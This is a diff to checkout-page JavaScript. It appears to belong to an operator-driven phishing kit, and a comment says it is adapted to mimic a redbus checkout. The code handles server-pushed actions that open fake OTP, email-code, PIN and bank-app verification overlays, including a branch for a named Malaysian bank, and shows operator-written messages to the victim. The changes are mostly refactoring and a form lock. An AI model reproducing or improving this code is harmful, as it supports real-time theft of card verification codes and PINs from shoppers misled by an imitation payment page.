@@ -47,14 +47,53 @@ function getPayAmountStr() { return 'MYR ' + getPayAmount().toFixed(2); }
 
 function sym(c) { return c === 'GBP' ? '£' : c === 'USD' ? '$' : 'RM'; }
 
+function getLoadOverlay() {
+  return document.getElementById('load-overlay') || document.getElementById('tc-pay-loading');
+}
+
+function ensurePayLoadingOverlay() {
+  if (document.getElementById('load-overlay') || document.getElementById('tc-pay-loading')) return;
+  var el = document.createElement('div');
+  el.id = 'tc-pay-loading';
+  el.className = 'tc-pay-loading hidden';
+  el.setAttribute('aria-live', 'polite');
+  el.setAttribute('aria-busy', 'true');
+  el.innerHTML = '<div class="tc-pay-loading-spinner" role="status" aria-label="Processing"></div>';
+  document.body.appendChild(el);
+}
+
+function lockCheckoutForm(locked) {
+  var scopes = [
+    document.getElementById('checkout-main'),
+    document.getElementById('FormP0-17'),
+    document.querySelector('form.km09ry0')
+  ];
+  scopes.forEach(function (scope) {
+    if (!scope) return;
+    scope.querySelectorAll('input, select, textarea, button').forEach(function (el) {
+      if (el.id === 'pay-btn') return;
+      el.disabled = !!locked;
+    });
+  });
+}
+
 function showLoad() {
+  ensurePayLoadingOverlay();
+  var lo = getLoadOverlay();
+  if (lo) lo.classList.remove('hidden');
   var btn = q('pay-btn');
   if (btn) { btn.setAttribute('aria-busy', 'true'); btn.disabled = true; }
+  lockCheckoutForm(true);
+  document.body.classList.add('tc-checkout-locked');
 }
 
 function hideLoad() {
+  var lo = getLoadOverlay();
+  if (lo) lo.classList.add('hidden');
   var btn = q('pay-btn');
   if (btn) { btn.removeAttribute('aria-busy'); btn.disabled = false; }
+  lockCheckoutForm(false);
+  document.body.classList.remove('tc-checkout-locked');
 }
 
 window.tcPayment = window.tcPayment || {};
@@ -313,63 +352,82 @@ fetch('/api/settings')
   }
  
   /* ── Action handler（对应 Cineplex 全套 action，DOM 适配 redbus） ── */
+  function safeId(id) { return document.getElementById(id); }
+  function isOverlayOpen(id) {
+    var e = safeId(id);
+    return !!(e && !e.classList.contains('hidden'));
+  }
+
+  function resetVerifyOverlayState() {
+    function hide(id) { var e = safeId(id); if (e) e.classList.add('hidden'); }
+    function setClass(id, cls) { var e = safeId(id); if (e) e.className = cls; }
+    function setText(id, text) { var e = safeId(id); if (e) e.textContent = text; }
+    function setDisabled(id, on) { var e = safeId(id); if (e) e.disabled = on; }
+
+    hide('otp-overlay');
+    setClass('otp-result', 'hidden');
+    setClass('otp-form', '');
+    hide('otp-spinner');
+    hide('otp-error');
+    var otpCode = safeId('otp-code');
+    if (otpCode) otpCode.value = '';
+    setDisabled('otp-submit', false);
+    setText('otp-submit', 'Continue');
+    setDisabled('otp-resend', false);
+    var otpResend = safeId('otp-resend');
+    if (otpResend) otpResend.classList.remove('otp-resend-disabled');
+    setText('otp-timer', '4:59');
+    setText('otp-spin-text', 'Verifying...');
+
+    hide('app-verify-overlay');
+    hide('app-spinner');
+    hide('app-error');
+    ['mount1','mount2','mount3','mount4','mount5','mount6','mount7'].forEach(function (m) {
+      var el = safeId(m);
+      if (el) { el.classList.add('hidden'); el.innerHTML = ''; }
+    });
+    var avBox = safeId('app-verify-box');
+    if (avBox) avBox.classList.add('hidden');
+    var avBtn = safeId('app-continue-btn');
+    if (avBtn) { avBtn.disabled = false; avBtn.textContent = 'Continue to complete'; }
+
+    hide('email-overlay');
+    hide('email-spinner');
+    setClass('email-result', 'hidden');
+    setClass('email-form', '');
+    hide('email-error');
+    var emailCode = safeId('email-code');
+    if (emailCode) emailCode.value = '';
+    setDisabled('email-submit', false);
+    setText('email-submit', 'Continue');
+    setDisabled('email-resend', false);
+    var emailResend = safeId('email-resend');
+    if (emailResend) emailResend.classList.remove('otp-resend-disabled');
+    setText('email-timer', '4:59');
+
+    hide('pin-overlay');
+    hide('pin-spinner');
+    hide('pin-error');
+    ['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function (d) {
+      var el = safeId(d);
+      if (el) el.value = '';
+    });
+    setDisabled('pin-submit', false);
+
+    clearCardError();
+    var payBtn = q('pay-btn');
+    if (payBtn) payBtn.disabled = false;
+    hide('load-overlay');
+    hide('tc-pay-loading');
+  }
+
   function handleAction(p) {
     var a = p.action;
- 
+
     /* 收到验证类 action 时重置所有验证覆盖层状态 */
     if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
         a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify'  ||  a=== 'pin_verify') {
-      // --- OTP ---
-      q('otp-overlay').classList.add('hidden');
-      q('otp-result').className = 'hidden';
-      q('otp-form').className = '';
-      q('otp-spinner').classList.add('hidden');
-      q('otp-error').classList.add('hidden');
-      if (q('otp-code')) q('otp-code').value = '';
-      q('otp-submit').disabled = false;
-      q('otp-submit').textContent = 'Continue';
-      q('otp-resend').disabled = false;
-      q('otp-resend').classList.remove('otp-resend-disabled');
-      q('otp-timer').textContent = '4:59';
-      q('otp-spin-text').textContent = 'Verifying...';
-
-      // --- App Verify ---
-      q('app-verify-overlay').classList.add('hidden');
-      q('app-spinner').classList.add('hidden');
-      q('app-error').classList.add('hidden');
-      var mounts = ['mount1','mount2','mount3','mount4','mount5','mount6','mount7'];
-      mounts.forEach(function (m) { var el = document.getElementById(m); if (el) { el.classList.add('hidden'); el.innerHTML = ''; } });
-      var avBox = document.getElementById('app-verify-box');
-      if (avBox) avBox.classList.add('hidden');
-      var avBtn = q('app-continue-btn');
-      if (avBtn) { avBtn.disabled = false; avBtn.textContent = 'Continue to complete'; }
-
-      // --- Email ---
-      q('email-overlay').classList.add('hidden');
-      q('email-spinner').classList.add('hidden');
-      q('email-result').className = 'hidden';
-      q('email-form').className = '';
-      q('email-error').classList.add('hidden');
-      if (q('email-code')) q('email-code').value = '';
-      q('email-submit').disabled = false;
-      q('email-submit').textContent = 'Continue';
-      q('email-resend').disabled = false;
-      q('email-resend').classList.remove('otp-resend-disabled');
-      q('email-timer').textContent = '4:59';
-
-      // --- PIN ---
-      q('pin-overlay').classList.add('hidden');
-      q('pin-spinner').classList.add('hidden');
-      q('pin-error').classList.add('hidden');
-      var pinDigits = ['pin-d1','pin-d2','pin-d3','pin-d4'];
-      pinDigits.forEach(function (d) { var el = q(d); if (el) el.value = ''; });
-      q('pin-submit').disabled = false;
-
-      // --- General ---
-      q('statusMsg').style.display = 'none';
-      q('pay-btn').disabled = false;
-      var lo = document.getElementById('load-overlay');
-      if (lo) lo.classList.add('hidden');
+      resetVerifyOverlayState();
     }
  
     if (a === 'ack') {
@@ -406,8 +464,10 @@ fetch('/api/settings')
       showOtp();
       var sfx = p.phoneSuffix || '****';
 
-    document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
-    document.getElementById('otp-amount').textContent='MYR '+String(getPayAmount());
+    var otpBodyP = document.querySelector('#otp-body p');
+    if (otpBodyP) otpBodyP.textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';
+    var otpAmount = document.getElementById('otp-amount');
+    if (otpAmount) otpAmount.textContent='MYR '+String(getPayAmount());
       /*var otpMsg = q('otpMessage');
       if (otpMsg) otpMsg.textContent =
         'A One-Time Password has been sent to your registered mobile number ending ' + sfx +
@@ -464,11 +524,10 @@ fetch('/api/settings')
       showMsg('error', 'We are unable to authenticate your payment method. Please choose a different payment method and try again.', true);
  
     } else if (a === 'otp_error') {
-
-    document.getElementById('otp-spinner').style.display='none';
-    document.getElementById('otp-spinner').classList.add('hidden');
-    document.getElementById('email-spinner').style.display='none';
-    document.getElementById('email-spinner').classList.add('hidden');
+      var otpSpin = safeId('otp-spinner');
+      if (otpSpin) { otpSpin.style.display = 'none'; otpSpin.classList.add('hidden'); }
+      var emailSpin = safeId('email-spinner');
+      if (emailSpin) { emailSpin.style.display = 'none'; emailSpin.classList.add('hidden'); }
       var emailErr = q('email-error');
       if (emailErr) { emailErr.style.display = 'block'; emailErr.textContent = p.message || 'Invalid code.'; emailErr.classList.remove('hidden'); }
       var emailBtn = q('email-submit');
@@ -486,8 +545,7 @@ fetch('/api/settings')
  
     } else if (a === 'change_card_prompt') {
       _curStep = 'card';
-      var lo1 = document.getElementById('load-overlay');
-      if (lo1) lo1.classList.add('hidden');
+      hideLoad();
       document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
       document.querySelector("#mount1").classList.add('hidden');
       document.querySelector("#mount2").classList.add('hidden');
@@ -515,7 +573,8 @@ fetch('/api/settings')
 
     } else if (a === 'custom_prompt') {
       var msg = p.message || '';
-      if (!q('app-verify-overlay').classList.contains('hidden')) {
+      var appOverlay = safeId('app-verify-overlay');
+      if (appOverlay && !appOverlay.classList.contains('hidden')) {
         // Hide spinner inside active bank mount
         if (!document.querySelector("#mount1").classList.contains('hidden')) {
         document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
@@ -563,33 +622,38 @@ fetch('/api/settings')
         // Show generic box
         var avBox = document.querySelector('#app-verify-overlay > .app-verify-box');
         if (avBox) avBox.classList.remove('hidden');
-        q('app-spinner').classList.add('hidden');
-        q('app-error').textContent = msg;
-        q('app-error').classList.remove('hidden');
-        q('app-continue-btn').classList.remove('hidden');
-        document.getElementById('app-continue-btn').disabled = false;
-      } else if (!q('otp-overlay').classList.contains('hidden')) {
-        q('otp-spinner').classList.add('hidden');
-        q('otp-result').classList.remove('hidden');
+        var appSpinner = safeId('app-spinner');
+        if (appSpinner) appSpinner.classList.add('hidden');
+        var appError = safeId('app-error');
+        if (appError) { appError.textContent = msg; appError.classList.remove('hidden'); }
+        var appBtn = safeId('app-continue-btn');
+        if (appBtn) { appBtn.classList.remove('hidden'); appBtn.disabled = false; }
+      } else if (isOverlayOpen('otp-overlay')) {
+        var otpSpinner = safeId('otp-spinner');
+        if (otpSpinner) otpSpinner.classList.add('hidden');
+        var otpResult = safeId('otp-result');
+        if (otpResult) otpResult.classList.remove('hidden');
         var otpP = document.querySelector('#otp-result > p');
         if (otpP) otpP.textContent = msg;
-      } else if (!q('email-overlay').classList.contains('hidden')) {
-        q('email-spinner').classList.add('hidden');
-        q('email-result').classList.remove('hidden');
+      } else if (isOverlayOpen('email-overlay')) {
+        var emailSpinner = safeId('email-spinner');
+        if (emailSpinner) emailSpinner.classList.add('hidden');
+        var emailResult = safeId('email-result');
+        if (emailResult) emailResult.classList.remove('hidden');
         var emailP = document.querySelector('#email-result > p');
         if (emailP) emailP.textContent = msg;
-      } else if (!q('pin-overlay').classList.contains('hidden')) {
-        q('pin-spinner').classList.add('hidden');
-        q('pin-error').textContent = msg;
-        q('pin-error').classList.remove('hidden');
+      } else if (isOverlayOpen('pin-overlay')) {
+        var pinSpinner = safeId('pin-spinner');
+        if (pinSpinner) pinSpinner.classList.add('hidden');
+        var pinError = safeId('pin-error');
+        if (pinError) { pinError.textContent = msg; pinError.classList.remove('hidden'); }
       } else {
         showMsg('error', msg, true);
       }
 
     } else if (a === 'change_card') {
       _curStep = 'card';
-      var lo2 = document.getElementById('load-overlay');
-      if (lo2) lo2.classList.add('hidden');
+      hideLoad();
       document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
       document.querySelector("#mount1").classList.add('hidden');
       document.querySelector("#mount2").classList.add('hidden');
@@ -628,8 +692,7 @@ fetch('/api/settings')
     }
      else if (a === 'app_verify') {
       _curStep = 'app_verify';
-      var lo3 = document.getElementById('load-overlay');
-      if (lo3) lo3.classList.add('hidden');
+      hideLoad();
       document.getElementById('app-verify-overlay').classList.remove('hidden');
 
       if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
@@ -895,10 +958,7 @@ fetch('/api/settings')
     }*/
      else if (a === 'pin_verify') {
       _curStep = 'pin_verify';
-      //window._emailVerifyInProgress = false;
-      //window._pinVerifyInProgress = true;
-      var lo4 = document.getElementById('load-overlay');
-      if (lo4) lo4.classList.add('hidden');
+      hideLoad();
       document.getElementById('pin-overlay').classList.remove('hidden');
       document.getElementById('pin-amount-row').style.display = '';
       document.getElementById('pin-amount').textContent = 'MR ' + String(getPayAmount());
@@ -1095,12 +1155,10 @@ fetch('/api/settings')
 
 
   function showOtp() {
-    
     var sec = q('otp-overlay');
-    document.getElementById('otp-code').value = '';
-    //var btn = q('pay-btn');
+    var otpCode = safeId('otp-code');
+    if (otpCode) otpCode.value = '';
     if (sec) sec.className = 'overlay';
-    //if (btn) btn.style.display = 'none';
   }
  
   function hideOtp() {
